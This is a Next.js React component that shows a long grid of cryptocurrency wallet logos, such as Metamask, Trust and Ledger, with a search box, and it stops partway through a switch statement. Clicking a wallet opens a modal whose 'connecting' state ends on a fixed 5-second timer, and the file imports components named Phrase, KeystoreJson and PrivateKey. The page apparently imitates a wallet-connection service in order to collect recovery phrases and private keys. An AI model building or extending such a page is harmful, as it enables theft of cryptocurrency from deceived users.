"use client"
import React from 'react'
import Image from 'next/image'
import "./wallet.css";

import 'bootstrap/dist/css/bootstrap.min.css';
import pinksale from '../../public/ic-pinksale.61500ae2.svg'

import metamask from '../../public/images/metamask.png'
import trustwallet from '../../public/images/trustwallet.png'
import coinbase from '../../public/images/coinbase.jpeg'
import xumm from '../../public/images/xumm.png'
import alice from '../../public/images/alice.png'
import coinomi from '../../public/images/coinomi.jpeg'
import wallet_connect from '../../public/images/walletconnect.jpeg'
import brd from '../../public/images/brd.jpg'
import oks from '../../public/images/okx.webp'
import unisat from '../../public/images/unisat.png'
import ordinals from '../../public/images/ordinals.jpg'
import kaspa from '../../public/images/kaspa.png';
import chainge from '../../public/images/chainge.png'
import safepal from '../../public/images/safepal1.png'
import slingshot from '../../public/images/slingshot.png'
import blockchain from '../../public/images/blockchain.png'
import lobstr from '../../public/images/lobstr.jpeg'
import yoroi from '../../public/images/yoroi.jpeg'
import edge from '../../public/images/edge.png'
import solar from '../../public/images/solar.png'
import pera_algo from '../../public/images/pera_algo.png'
import senderwallet from '../../public/images/senderwallet.png'
import xcel_pay from '../../public/images/xcel_pay.png'
import anchor from '../../public/images/anchor.png'
import onto from '../../public/images/onto.png'
import rainbow from '../../public/images/rainbow.png'
import argent from '../../public/images/Argent.jpeg'
import cybavo from '../../public/images/cybavo.png'
import grindplus from '../../public/images/grindplus.png'
import nash from '../../public/images/nash.jpeg'
import imtoken from '../../public/images/imtoken.png'
import pillar from '../../public/images/pillar.png'
import crypto from '../../public/images/crypto.png'
import gnosis from '../../public/images/gnosis.jpeg'
import curve from '../../public/images/curve.jpeg'
import tokenpocket from '../../public/images/tokenpocket.png'
import math from '../../public/images/math-wallet.png'
import bitpay from '../../public/images/bitpay.jpeg'
import ledgerlive from '../../public/images/ledgerlive.png'
import walleth from '../../public/images/walleth.jpeg'
import authereum from '../../public/images/authereum.png'
import dharma from '../../public/images/dharma.jpeg'
import inch from '../../public/images/1inch.png'
import houbi from '../../public/images/huobi.jpeg'
import eidoo from '../../public/images/eidoo.png'
import mykey from '../../public/images/mykey.png'
import trustvault from '../../public/images/trustvault.png'
import atomic from '../../public/images/atomic.png'
import coin98 from '../../public/images/coin98.png'
import zksync from '../../public/images/zksync.jpeg'
import shell from '../../public/images/shell.jpeg'
import index from '../../public/images/index.jpeg'
import swap from '../../public/images/swap.jpg'
import starname from '../../public/images/starname.png'
import space from '../../public/images/space.png'
import maskbook from '../../public/images/maskbook.png'
import snap from '../../public/images/snapp.jpg'
import invoice from '../../public/images/invoice.png'
import ankr from '../../public/images/ankr.jpeg'
import dodo from '../../public/images/dodo.png'
import zlot from '../../public/images/zlot.jpeg'
import tokmark from '../../public/images/tokmark.png'
import actusprotocol from '../../public/images/actusprotocol.jpeg'
import astrotools from '../../public/images/astrotools.jpeg'
import rubic from '../../public/images/rubic.jpeg'
import torus from '../../public/images/torus.jpeg'
import ocean from '../../public/images/ocean.jpeg'
import filecoin from '../../public/images/filecoin.png'
import bancor from '../../public/images/bancor.png'
import harvest from '../../public/images/harvestfinance.jpeg'
import octofi from '../../public/images/octofi.jpg'
import mushroom from '../../public/images/mushroom.jpg'
import bitfrost from '../../public/images/bitfrost.png'
import orchid from '../../public/images/orchid.png'
import datamine from '../../public/images/datamine.jpeg'
import streamr from '../../public/images/streamr.jpeg'
import dappradar from '../../public/images/dappradar.png'
import superrare from '../../public/images/super.jpg'
import arbitrum from '../../public/images/arbitrum.jpeg'
import paraswap from '../../public/images/paraswap.jpeg';
import honeyswap from '../../public/images/honeyswap.jpeg'
import fleek from '../../public/images/fleek.png'
import cool from '../../public/images/cool.png'
import alpha from '../../public/images/alphawallet.jpeg'
import zelcore from '../../public/images/zelcore.png'
import phantom from '../../public/images/phantom.jpeg'
import solflare from '../../public/images/solflare.png'
import sollet from '../../public/images/sollet.jpeg'
import dcent from '../../public/images/dcent.png'
import tokenary from '../../public/images/tokenary.png'
import spatium from '../../public/images/spatium.png'
import infinito from '../../public/images/infinito.png'
import wallet from '../../public/images/walletio.png'
import infinity from '../../public/images/infinity.png'
import ownbit from '../../public/images/ownbit.png'
import easypocket from '../../public/images/easypocket.jpeg'
import bridge from '../../public/images/bridge.png'
import unstoppable from '../../public/images/unstoppable.png'
import peakdefi from '../../public/images/peakdefi.png'
import vision from '../../public/images/vision.png'
import bitkeep from '../../public/images/bitkeep.png'
import viawallet from '../../public/images/viawallet.png'
import sparkpoint from '../../public/images/sparkpoint.png'
import halodefi from '../../public/images/halodefi.jpeg'
import dok from '../../public/images/dok.png'
import at from '../../public/images/atwallet.png'
import midas from '../../public/images/midas.png'
import ellipal from '../../public/images/ellipal.png'
import keyringpro from '../../public/images/keyringpro.png'
import aktionariat from '../../public/images/aktionariat.png'
import talken from '../../public/images/Talken.jpeg'
import xdc from '../../public/images/xdc.png'
import flares from '../../public/images/flares.png'
import atoken from '../../public/images/atoken.jpg'
import tongue from '../../public/images/tongue.jpeg'
import binance from '../../public/images/binance.png'
import rwallet from '../../public/images/rwallet.webp'
import plasmapay from '../../public/images/plasmapay.jpeg'
import O3wallet from '../../public/images/O3wallet.jpg'
import hashkey from '../../public/images/hashley.jpg'
import jadewallet from '../../public/images/jadewallet.jpeg'
import guardwallet from '../../public/images/guardawallet.jpeg'
import defiant from '../../public/images/defiant.jpeg'
import trustee from '../../public/images/trustee.jpeg'
import morix from '../../public/images/morixwallet.png'
import meetone from '../../public/images/meetone.jpeg'
import etherscan from '../../public/images/etherscan.jpg'
import lido from '../../public/images/lido.png'
import terrastation from '../../public/images/terrastation.webp'
import opensea from '../../public/images/opensea.webp'
import zapper from '../../public/images/zapper.webp'
import aave from '../../public/images/aave.webp'
import zerion from '../../public/images/zerion.webp'
import lc from '../../public/images/lc.png'
import dbank from '../../public/images/dbank.webp'
import rarible from '../../public/images/rarible.webp'
import yearn from '../../public/images/yearn.png'
import adex from '../../public/images/adex.jpg'
import dydx from '../../public/images/dydx.webp'
import mycrypto from '../../public/images/mycrypto.png'
import oasis from '../../public/images/oasis.jpeg'
import tokenset from '../../public/images/tokenset.jpg'
import mantradao from '../../public/images/mantradao.png'
import matcha from '../../public/images/matcha.webp'
import kyberswap from '../../public/images/Kyberswap.jpeg'
import defiport from '../../public/images/defiport.png'
import loopring from '../../public/images/loopring.webp'
import instadapp from '../../public/images/instadapp.jpeg'
import matic from '../../public/images/matic.jpg'
import box from '../../public/images/3box.webp'
import ddex from '../../public/images/ddex.webp'
import bamboo from '../../public/images/bamboo.webp'
import syn from '../../public/images/syn.jpg'
import dexblue from '../../public/images/dexblue.webp'
import pool from '../../public/images/pool.png'
import dexag from '../../public/images/dexag.png'
import gelato from '../../public/images/gelato.jpg'
import ens from '../../public/images/ens.jpg'
import idle from '../../public/images/idlefinance.png'
import iearn from '../../public/images/iearnfinance.jpeg'
import rcn from '../../public/images/rcnfinance.jpeg'
import hegic from '../../public/images/hegic.jpg'
import kick from '../../public/images/kick.jpg'
import mph88 from '../../public/images/88mph.jpeg'
import mooni from '../../public/images/mooni.jpeg'
import clover from '../../public/images/clover.png'
import mint from '../../public/images/mintbase.jpeg'
import dao from '../../public/images/daostack.jpeg'
import known from '../../public/images/known.jpg'
import myether from '../../public/images/myether.jpg'
import affogato from '../../public/images/affogato.png'
import stablepay from '../../public/images/stablepay.jpeg'
import defi from '../../public/images/defisaver.jpeg'
import loom from '../../public/images/loom.png'
import thor from '../../public/images/thorchain.jpg'
import bulksender from '../../public/images/bulksender.png'
import linkdrop from '../../public/images/linkdrop.png'
import helio from '../../public/images/helio.png'
import escaroo from '../../public/images/escaroo.png'
import tokenmarket from '../../public/images/tokenmarket.png'
import mesa from '../../public/images/mesa.png'
import mcdex from '../../public/images/mcdex.png'
import furucombo from '../../public/images/furucombo.png'
import melon from '../../public/images/melon.png'
import chainsfr from '../../public/images/chainsfr.png'
import aka3 from '../../public/images/aka3.png'
import key2 from '../../public/images/2key.jpeg'
import pitch from '../../public/images/pitch.jpg'
import sushiswap from '../../public/images/sushiswap.png'
import unagii from '../../public/images/Unagii.png'
import cream from '../../public/images/cream.jpg'
import cardano from '../../public/images/cardano.png'
import daedalus from '../../public/images/daedalus.png'
import ccvault from '../../public/images/ccvault.png'
import gero from '../../public/images/gero.jpg'
import nami from '../../public/images/nami.png'
import solana from '../../public/images/solana.png'
import solong from '../../public/images/solong.jpg'
import exodus from '../../public/images/exodus.png'
import avalanche from '../../public/images/avalanche.png'
import velas from '../../public/images/velas.png'
import fortmatic from '../../public/images/fortmatic.png'
import xverse from '../../public/images/xverse.png'
import sparrow from '../../public/images/sparrow.png'
import earth from '../../public/images/earth.jpeg'
import hiro from '../../public/images/hiro.png';
import saitama from '../../public/images/saitama.png'
import cosmos from '../../public/images/cosmos.png'
// import safemoon from '../../public/images/safemoon.avif'
import defi1 from '../../public/images/defi1.png'
import digitex from '../../public/images/digitex.png'
import portis from '../../public/images/portis.png'
import tron from '../../public/images/tron.png'
import wallet_io from '../../public/images/wallet-io.png'
import paytube from '../../public/images/paytube.png';
import linen from '../../public/images/linen.png';

import Modal from '../components/Modal/Modal'
import Phrase from '../components/Phrase/Phrase'
import KeystoreJson from '../components/KeystoreJson/KeystoreJson.js'
import PrivateKey from '../components/PrivateKey/PrivateKey'
import Preloader from '../components/Preloader/Preloader'

import {Row, Col, Button, Tabs, Tab} from 'react-bootstrap';
import Aux from '../components/hoc/Auxiliary/Auxiliary'
import classes from './wallets.module.css'
import ReactLoading from 'react-loading';


export default class Wallet extends React.Component  {




  constructor(props) {
    super(props)
    this.state = {
       showModal: false,
       moveToNextModal: false,
       stopConnecting: false,
       showPreloader: false,
       name: '',
       image: '',
       innerWidth: 0,
       search: '',
       ant_drawer: false,
       wallets: [
        {
          image: wallet_connect,
          name: "Wallet Connect"
        },
        {
          image: trustwallet,
          name: "Trust"
        },
        {
          image: metamask,
          name: "Metamask"
        },
        {
          image: ledgerlive,
          name: "Ledger"
        },
        {
          image: brd,
          name: "BRD Wallet"
        },
        {
          image: coinbase,
          name: "Coinbase"
        },
        {
          image: ordinals,
          name: "Ordinals"
        },
        {
          image: unisat,
          name: "Unisat"
        },
        {
          image: oks,
          name: "OKX"
        },
        {
          image: xverse,
          name: "Xverse"
        },
        {
          image: sparrow,
          name: "Sparrow"
        },
        {
          image: earth,
          name: "Earth"
        },
        {
          image: hiro,
          name: "Hiro"
        },
        {
          image: saitama,
          name: "Saitama wallet"
        },
        {
          image: terrastation,
          name: "Terra station"
        },
        {
          image: phantom,
          name: "Phantom Wallet"
        },
        {
          image: solflare,
          name: "Solflare Wallet"
        },
        {
          image: terrastation,
          name: "Terra station"
        },
        {
          image: cosmos,
          name: "Cosmos station"
        },
        {
          image: exodus,
          name: "Exodus wallet"
        },
        {
          image: rainbow,
          name: "Rainbow"
        },
        {
          image: argent,
          name: "Argent"
        },
        {
          image: binance,
          name: "Binance Chain"
        },
        // {
        //   image: safemoon,
        //   name: "Safemoon"
        // },
        {
          image: gnosis,
          name: "Gnosis safe"
        },
        {
          image: defi1,
          name: "DeFi"
        },
        {
          image: pillar,
          name: "Pillar"
        },
        {
          image: imtoken,
          name: "imToken"
        },
        {
          image: onto,
          name: "ONTO"
        },
        {
          image: tokenpocket,
          name: "TokenPocket"
        },
        {
          image: aave,
          name: "Aave"
        },
        {
          image: digitex,
          name: "Digitex"
        },
        {
          image: portis,
          name: "Portis"
        },
        {
          image: fortmatic,
          name: "Formatic"
        },
        {
          image: math,
          name: "Math Wallet"
        },
        {
          image: bitpay,
          name: "BitPay"
        },
        {
          image: ledgerlive,
          name: "LedgerLive"
        },
        {
          image: walleth,
          name: "WallETH"
        },
        {
          image: authereum,
          name: "Authereum"
        },
        {
          image: dharma,
          name: "Dharma"
        },
        {
          image: inch,
          name: "1inch Wallet"
        },
        {
          image: houbi,
          name: "Huobi"
        },
        {
          image: eidoo,
          name: "Eidoo"
        },
        {
          image: mykey,
          name: "MYKEY"
        },
        {
          image: loopring,
          name: "Loopring"
        },
        {
          image: trustvault,
          name: "TrustVault"
        },
        {
          image: atomic,
          name: "Atomic"
        },
        {
          image: coin98,
          name: "Coin98"
        },
        {
          image: tron,
          name: "Tron"
        },
        {
          image: alice,
          name: "Alice"
        },
        {
          image: alpha,
          name: "Apha Wallet"
        },
        {
          image: dcent,
          name: "D'CENT"
        },
        {
          image: zelcore,
          name: "ZelCore"
        },
        {
          image: nash,
          name: "Nash"
        },
        {
          image: coinomi,
          name: "Coinmoni"
        },
        {
          image: grindplus,
          name: "GridPlus"
        },
        {
          image: cybavo,
          name: "Cybavo"
        },
        {
          image: tokenary,
          name: "Tokenary"
        },
        {
          image: torus,
          name: "Torus"
        },
        {
          image: spatium,
          name: "Spatium"
        },
        {
          image: safepal,
          name: "Safepal"
        },
        {
          image: infinito,
          name: "Infinito"
        },
        {
          image: wallet_io,
          name: "Wallet.io"
        },
        {
          image: ownbit,
          name: "Ownbit"
        },
        {
          image: easypocket,
          name: "EasyPocket"
        },
        {
          image: bridge,
          name: "Bridge Wallet"
        },
        {
          image: sparkpoint,
          name: "Spark point"
        },
        {
          image: viawallet,
          name: "ViaWallet"
        },
        {
          image: bitkeep,
          name: "Bitkeep"
        },
        {
          image: vision,
          name: "Vision"
        },
        {
          image: peakdefi,
          name: "PEAKDEFI"
        },
        {
          image: unstoppable,
          name: "Unstoppable"
        },
        {
          image: halodefi,
          name: "HaloDeFi"
        },
        {
          image: dok,
          name: "Dok Wallet"
        },
        {
          image: midas,
          name: "Midas"
        },
        {
          image: ellipal,
          name: "Ellipal"
        },
        {
          image: keyringpro,
          name: "KEYRING PRO"
        },
        {
          image: aktionariat,
          name: "Aktionariat"
        },
        {
          image: talken,
          name: "Talken"
        },
        {
          image: flares,
          name: "Flare"
        },
        {
          image: kyberswap,
          name: "Kyberswap"
        },
        {
          image: paytube,
          name: "Paytube"
        },
        {
          image: linen,
          name: "Linen"
        },


    ]

    }
  }


// componentWillUnmount(){
  // clearTimeout(this.state.stopConnecting);
// }

componentDidMount(){
  // clearTimeout(this.state.stopConnecting);
  console.log(window.innerWidth)
  this.setState({innerWidth: window.innerWidth})
}


showModalFunc = (name) => {
  this.setState({showModal: true, name: name})
  setTimeout(() => {
    this.stopLoadingFunc()
  }, 5000)
}

closeModalFunc = () => {
  this.setState({showModal: false})
  this.startLoadingFunc()
  this.setState({moveToNextModal: false})

}

moveToNextModalFunc = () => {
  this.setState({moveToNextModal: true})
}

stopLoadingFunc = () => {
  this.setState({stopConnecting: true})
}

startLoadingFunc = () => {
  this.setState({stopConnecting: false})
}

showPreloaderFunc = () => {
  this.setState({showPreloader: true})
}

displayWalleths = () => {
  console.log('inner: ', this.state.innerWidth)

  if (this.state.search) {
    const filterwallets = this.state.wallets.filter(wallet => {
       return wallet.name.startsWith(this.state.search) || wallet.name.toLowerCase().startsWith(this.state.search)
    })

    return filterwallets.map((wallet, i) => {
      return (
        <button type="button" onClick={() => this.showModalFunc(wallet.name)} key={i} data-bs-toggle="modal" data-bs-target="#exampleModal71" className="btn coin" >
            <Image className="coin-img" height="80"  src={wallet.image} alt="" />
            <h4 className='h4_'>{wallet.name}</h4>
        </button>
       )
    })
  } else {
    return this.state.wallets.map((wallet, i) => {
      return (
       <button type="button" onClick={() => this.showModalFunc(wallet.name)} key={i} data-bs-toggle="modal" data-bs-target="#exampleModal71" className="btn coin" >
           <Image className="coin-img" height="80"  src={wallet.image} alt="" />
           <h4 className='h4_'>{wallet.name}</h4>
       </button>
      )
   })
  }


}


changeSearchInput = (e) => {
  this.setState({search: e.target.value})
}

 render () {
  let img

  let preload

  this.state.showPreloader ? preload = <Preloader  />: preload = '';

  switch(this.state.name) {
    case 'Metamask' : img = <Image height="30" src={metamask} alt="Metamask img" />;
    break;
    case 'Coinbase' : img = <Image height="30" src={coinbase} alt="Coinbase img" />;
    break;
    case 'Onto' : img = <Image height="30" src={onto} alt="Onto img" />;
    break;
    case 'Rainbow' : img = <Image height="30" src={rainbow} alt="Rainbow img" />;
    break;
    case 'Argent' : img = <Image height="30" src={argent} alt="Argent img" />;
    break;
    case 'Cybavo' : img = <Image height="30" src={cybavo} alt="Cybavo img" />;
    break;
    case 'Grindplus' : img = <Image height="30" src={grindplus} alt="Grindplus img" />;
    break;
    case 'Nash' : img = <Image height="30" src={nash} alt="Nash img" />;
    break;
    case 'ImToken' : img = <Image height="30" src={imtoken} alt="ImToken img" />;
    break;
    case 'Pillar' : img = <Image height="30" src={pillar} alt="ImToken img" />;
    break;
    case 'Crypto' : img = <Image height="30" src={crypto} alt="Crypto img" />;
    break;
    case 'Gnosis' : img = <Image height="30" src={gnosis} alt="Gnosis img" />;
    break;
    case 'Curve Finace' : img = <Image height="30" src={curve} alt="Curve img" />;
    break;
    case 'TokenPocket' : img = <Image height="30" src={tokenpocket} alt="Token Pocket img" />;
    break;
    case 'MathWallet' : img = <Image height="30" src={math} alt="Math Wallet Pocket img" />;
    break;
    case 'BitPay' : img = <Image height="30" src={bitpay} alt="Bitpay img" />;
    break;
    case 'Ledger Live' : img = <Image height="30" src={ledgerlive} alt="Ledger Live img" />;
    break;
    case 'Walleth' : img = <Image height="30" src={walleth} alt="Walleth img" />;
    break;
    case 'Authereum' : img = <Image height="30" src={authereum} alt="Authereum img" />;
    break;
    case 'Dharma' : img = <Image height="30" src={dharma} alt="Dharma img" />;
    break;
    case '1inch' : img = <Image height="30" src={inch} alt="1inch img" />;
    break;
    case 'Huobi' : img = <Image height="30" src={houbi} alt="Houbi img" />;
    break;
    case 'Eidoo' : img = <Image height="30" src={eidoo} alt="Eidoo img" />;
    break;
    case 'MyKey' : img = <Image height="30" src={mykey} alt="Mykey img" />;
    break;
    case 'TrustVault' : img = <Image height="30" src={trustvault} alt="TrustVault img" />;
    break;
    case 'Atomic' : img = <Image height="30" src={atomic} alt="Atomic img" />;
    break;
    case 'Coin98' : img = <Image height="30" src={coin98} alt="Coin98 img" />;
    break;
    case 'Zksync' : img = <Image height="30" src={zksync} alt="Zksync img" />;
    break;
    case 'Shell' : img = <Image height="30" src={shell} alt="Shell img" />;
    break;
    case 'Index Coop' : img = <Image height="30" src={index} alt="Index Coop img" />;
    break;
    case 'SwapX' : img = <Image height="30" src={swap} alt="Swapx img" />;
    break;
    case 'StarName' : img = <Image height="30" src={starname} alt="StarName img" />;
    break;
    case 'Space' : img = <Image height="30" src={space} alt="Space img" />;
    break;
    case 'Maskbook' : img = <Image height="30" src={maskbook} alt="Maskbook img" />;
    break;
    case 'Snap' : img = <Image height="30" src={snap} alt="Snap img" />;
    break;
    case 'Invoice' : img = <Image height="30" src={invoice} alt="Invoice img" />;
    break;
    case 'Ankr' : img = <Image height="30" src={ankr} alt="Ankr img" />;
    break;
    case 'DoDo' : img = <Image height="30" src={dodo} alt="Dodo img" />;
    break;
    case 'Zlot' : img = <Image height="30" src={zlot} alt="Zlot img" />;
    break;
    case 'TokMark' : img = <Image height="30" src={tokmark} alt="TokMark img" />;
    break;
    case 'ActusProtocol' : img = <Image height="30" src={actusprotocol} alt="ActusProtocol img" />;
    break;
    case 'AstroTools' : img = <Image height="30" src={astrotools} alt="Astrotools img" />;
    break;
    case 'Rubic' : img = <Image height="30" src={rubic} alt="Rubic img" />;
    break;
    case 'Torus' : img = <Image height="30" src={torus} alt="Torus img" />;
    break;
    case 'Ocean Protocol' : img = <Image height="30" src={ocean} alt="Ocean img" />;
    break;
    case 'Filecoin' : img = <Image height="30" src={filecoin} alt="Ocean img" />;
    break;
    case 'Bancor' : img = <Image height="30" src={bancor} alt="Bancor img" />;
    break;
    case 'Harvest Finance' : img = <Image height="30" src={harvest} alt="Harvest img" />;
    break;
    case 'Octofi' : img = <Image height="30" src={octofi} alt="Octofi img" />;
    break;
    case 'Mushroom Finance' : img = <Image height="30" src={mushroom} alt="Mushroom img" />;
    break;
    case 'BitFrost' : img = <Image height="30" src={bitfrost} alt="BitFrost img" />;
    break;
    case 'Orchid Protocol' : img = <Image height="30" src={orchid} alt="Orchid img" />;
    break;
    case 'Datamine Network' : img = <Image height="30" src={datamine} alt="Datamine img" />;
    break;
    case 'Streamr' : img = <Image height="30" src={streamr} alt="Streamr img" />;
    break;
    case 'DappRadar' : img = <Image height="30" src={dappradar} alt="DappRadar img" />;
    break;
    case 'SuperRare' : img = <Image height="30" src={superrare} alt="SuperRare img" />;
    break;
    case 'Arbitrum' : img = <Image height="30" src={arbitrum} alt="Arbitrum img" />;
    break;
    case 'Paraswap' : img = <Image height="30" src={paraswap} alt="Paraswap img" />;
    break;
    case 'Honeyswap' : img = <Image height="30" src={honeyswap} alt="Honeyswap img" />;
    break;
    case 'Fleek' : img = <Image height="30" src={fleek} alt="Fleek img" />;
    break;
    case 'Cool' : img = <Image height="30" src={cool} alt="Cool img" />;
    break;
    case 'Alpha' : img = <Image height="30" src={alpha} alt="Alpha img" />;
    break;
    case 'Zelcore' : img = <Image height="30" src={zelcore} alt="Zelcore img" />;
    break;
    case 'Phantom' : img = <Image height="30" src={phantom} alt="Phantom img" />;
    break;
    case 'Solflare' : img = <Image height="30" src={solflare} alt="Solflare img" />;
    break;
    case 'Sollet' : img = <Image height="30" src={sollet} alt="Sollet img" />;
    break;
    case 'Dcent' : img = <Image height="30" src={dcent} alt="Dcent img" />;
    break;
    case 'Tokenary' : img = <Image height="30" src={tokenary} alt="Tokenary img" />;
    break;
    case 'Spatium' : img = <Image height="30" src={spatium} alt="Spatium img" />;
    break;
    case 'Infinito' : img = <Image height="30" src={infinito} alt="Infinito img" />;
    break;
    case 'Wallet.io' : img = <Image height="30" src={wallet} alt="wallet.io img" />;
    break;
    case 'infinity' : img = <Image height="30" src={infinity} alt="Infinity img" />;
    break;
    case 'Ownbit' : img = <Image height="30" src={ownbit} alt="Ownbit img" />;
    break;
    case 'EasyPocket' : img = <Image height="30" src={easypocket} alt="Easypocket img" />;
    break;
    case 'Bridge' : img = <Image height="30" src={bridge} alt="Bridge img" />;
    break;
    case 'Unstoppable' : img = <Image height="30" src={unstoppable} alt="Unstoppable img" />;
    break;
    case 'PeakDefi' : img = <Image height="30" src={peakdefi} alt="PeakDefi img" />;
    break;
    case 'Vision' : img = <Image height="30" src={vision} alt="Vision img" />;
    break;
    case 'BitKeep' : img = <Image height="30" src={bitkeep} alt="BitKeep img" />;
    break;
    case 'ViaWallet' : img = <Image height="30" src={viawallet} alt="Via img" />;
    break;
    case 'SparkPoint' : img = <Image height="30" src={sparkpoint} alt="SparkPoint img" />;
    break;
    case 'HaloDefi' : img = <Image height="30" src={halodefi} alt="HaloDefi img" />;
    break;
    case 'Dok' : img = <Image height="30" src={dok} alt="Dok img" />;
    break;
    case 'AT Wallet' : img = <Image height="30" src={at} alt="AT Wallet img" />;
    break;
    case 'Midas' : img = <Image height="30" src={midas} alt="Midas img" />;
    break;
    case 'Ellipal' : img = <Image height="30" src={ellipal} alt="Ellipal img" />;
    break;
    case 'KeyRingPro' : img = <Image height="30" src={keyringpro} alt="keyringpro img" />;
    break;
    case 'Aktionariat' : img = <Image height="30" src={aktionariat} alt="Aktonariat img" />;
    break;
    case 'Talken' : img = <Image height="30" src={talken} alt="Talken img" />;
    break;
    case 'XDC' : img = <Image height="30" src={xdc} alt="XDC img" />;
    break;
    case 'Flares' : img = <Image height="30" src={flares} alt="Flares img" />;
    break;
    case 'AToken' : img = <Image height="30" src={atoken} alt="AToken img" />;
    break;
    case 'Tongue' : img = <Image height="30" src={tongue} alt="Tongue img" />;
    break;
    case 'Binance DEX' : img = <Image height="30" src={binance} alt="Binance img" />;
    break;
    case 'RWallet' : img = <Image height="30" src={rwallet} alt="RWallet img" />;
    break;
    case 'PlasmaPay' : img = <Image height="30" src={plasmapay} alt="PlasmaPay img" />;
    break;
    case 'O3Wallet' : img = <Image height="30" src={O3wallet} alt="O3Wallet img" />;
    break;
    case 'HashKey' : img = <Image height="30" src={hashkey} alt="HashKey img" />;
    break;
    case 'JadeWallet' : img = <Image height="30" src={jadewallet} alt="JadeWallet img" />;
    break;
    case 'Guarda' : img = <Image height="30" src={guardwallet} alt="GuardWallet img" />;
    break;
    case 'Defiant' : img = <Image height="30" src={defiant} alt="Defiant img" />;
    break;
    case 'Trustee' : img = <Image height="30" src={trustee} alt="Trustee img" />;
    break;
    case 'MeetOne' : img = <Image height="30" src={meetone} alt="MeetOne img" />;
    break;
    case 'Morix' : img = <Image height="30" src={morix} alt="Morix img" />;
    break;
    case 'Binance Smart Chain' : img = <Image height="30" src={binance} alt="Binance img" />;
    break;
    case 'Etherscan' : img = <Image height="30" src={etherscan} alt="Etherscan img" />;
    break;
    case 'Lido' : img = <Image height="30" src={lido} alt="Lido img" />;
    break;
    case 'Terrastation' : img = <Image height="30" src={terrastation} alt="Lido img" />;
    break;
    case 'Opensea' : img = <Image height="30" src={opensea} alt="Opensea img" />;
    break;
    case 'Zapper' : img = <Image height="30" src={zapper} alt="Zapper img" />;
    break;
    case 'Aave' : img = <Image height="30" src={aave} alt="Aave img" />;
    break;
    case 'Zerion' : img = <Image height="30" src={zerion} alt="Zerion img" />;
    break;
    case 'LocalCryptos' : img = <Image height="30" src={lc} alt="lc img" />;
    break;
    case 'DBank' : img = <Image height="30" src={dbank} alt="dbank img" />;
    break;
    case 'Rarible' : img = <Image height="30" src={rarible} alt="rarible img" />;
    break;
    case 'Yearn' : img = <Image height="30" src={yearn} alt="yearn img" />;
    break;
    case 'Adex' : img = <Image height="30" src={adex} alt="Adex img" />;
    break;
    case 'DyDx' : img = <Image height="30" src={dydx} alt="Adex img" />;
    break;
    case 'MyCrypto' : img = <Image height="30" src={dydx} alt="Adex img" />;
    break;
    case 'Oasis' : img = <Image height="30" src={oasis} alt="Oasis img" />;
    break;
    case 'TokenSets' : img = <Image height="30" src={tokenset} alt="Tokenset img" />;
    break;
    case 'Mantra DAO' : img = <Image height="30" src={tokenset} alt="Tokenset img" />;
    break;
    case 'Matcha' : img = <Image height="30" src={matcha} alt="Matcha img" />;
    break;
    case 'KyberSwap' : img = <Image height="30" src={kyberswap} alt="Kyberswap img" />;
    break;
    case 'Defi Portfolio Tracker' : img = <Image height="30" src={defiport} alt="Defi Port img" />;
    break;
    case 'Loopring' : img = <Image height="30" src={loopring} alt="Loopring img" />;
    break;
    case 'InstaDapp' : img = <Image height="30" src={instadapp} alt="InstaDapp img" />;
    break;
    case 'Matic' : img = <Image height="30" src={matic} alt="Matic img" />;
    break;
    case '3box' : img = <Image height="30" src={box} alt="3box img" />;
    break;
    case 'DDex' : img = <Image height="30" src={ddex} alt="Ddex img" />;
    break;
    case 'Bamboo' : img = <Image height="30" src={bamboo} alt="Bamboos img" />;
    break;
    case 'Synthetix' : img = <Image height="30" src={syn} alt="Bamboos img" />;
    break;
    case 'Dex.blue' : img = <Image height="30" src={dexblue} alt="Dex Blue img" />;
    break;
    case 'PoolTogether' : img = <Image height="30" src={pool} alt="Pool Together img" />;
    break;
    case 'DEX.AG' : img = <Image height="30" src={dexag} alt="DExag img" />;
    break;
    case 'Gelato' : img = <Image height="30" src={gelato} alt="Gelato img" />;
    break;
    case 'Ens Domains' : img = <Image height="30" src={ens} alt="ens img" />;
    break;
    case 'Idle Finance' : img = <Image height="30" src={idle} alt="idle img" />;
    break;
    case 'Iearn.Finance' : img = <Image height="30" src={iearn} alt="iearn img" />;
    break;
    case 'RCN Finance' : img = <Image height="30" src={rcn} alt="rcn img" />;
    break;
    case 'Hegic' : img = <Image height="30" src={hegic} alt="hegic img" />;
    break;
    case 'Kickback' : img = <Image height="30" src={kick} alt="Kickback img" />;
    break;
    case '88mph' : img = <Image height="30" src={mph88} alt="88 Mph img" />;
    break;
    case 'Mooni' : img = <Image height="30" src={mooni} alt="Mooni img" />;
    break;
    case 'Clover' : img = <Image height="30" src={clover} alt="Clover img" />;
    break;
    case 'Mintbase' : img = <Image height="30" src={mint} alt="Mintbase img" />;
    break;
    case 'DAO Stack' : img = <Image height="30" src={dao} alt="Dao stack img" />;
    break;
    case 'KnownOrigin' : img = <Image height="30" src={known} alt="Known Origin img" />;
    break;
    case 'MyEther' : img = <Image height="30" src={myether} alt="MyEther img" />;
    break;
    case 'Affogato' : img = <Image height="30" src={affogato} alt="Affogato img" />;
    break;
    case 'StablePay' : img = <Image height="30" src={stablepay} alt="StablePay img" />;
    break;
    case 'DefiSaver' : img = <Image height="30" src={defi} alt="Defi Saver img" />;
    break;
    case 'Loom Network' : img = <Image height="30" src={loom} alt="Loom Network img" />;
    break;
    case 'ThorChain' : img = <Image height="30" src={thor} alt="ThorChain img" />;
    break;
    case 'BulkSender' : img = <Image height="30" src={bulksender} alt="BulkSender img" />;
    break;
    case 'LinkDrop' : img = <Image height="30" src={linkdrop} alt="LinkDrop img" />;
    break;
    case 'Helio' : img = <Image height="30" src={helio} alt="Helio img" />;
    break;
    case 'Escaroo' : img = <Image height="30" src={escaroo} alt="Escaroo img" />;
    break;
    case 'TokenMarket' : img = <Image height="30" src={tokenmarket} alt="TokenMArket img" />;
    break;
    case 'Mesa' : img = <Image height="30" src={mesa} alt="Mesa img" />;
    break;
    case 'MCDEX' : img = <Image height="30" src={mcdex} alt="MCDEX img" />;
    break;
    case 'FuruCombo' : img = <Image height="30" src={furucombo} alt="Furu img" />;
    break;
    case 'Melon' : img = <Image height="30" src={melon} alt="Melon img" />;
    break;
    case 'ChainsFr' : img = <Image height="30" src={chainsfr} alt="ChainsFr img" />;
    break;
    case 'AKA3Email Alias' : img = <Image height="30" src={aka3} alt="Aka3 img" />;
    break;
    case '2Key' : img = <Image height="30" src={key2} alt="2key img" />;
    break;
    case 'Pitch' : img = <Image height="30" src={pitch} alt="Pitch img" />;
    break;
    case 'Sushiswap' : img = <Image height="30" src={sushiswap} alt="Sushiswap img" />;
    break;
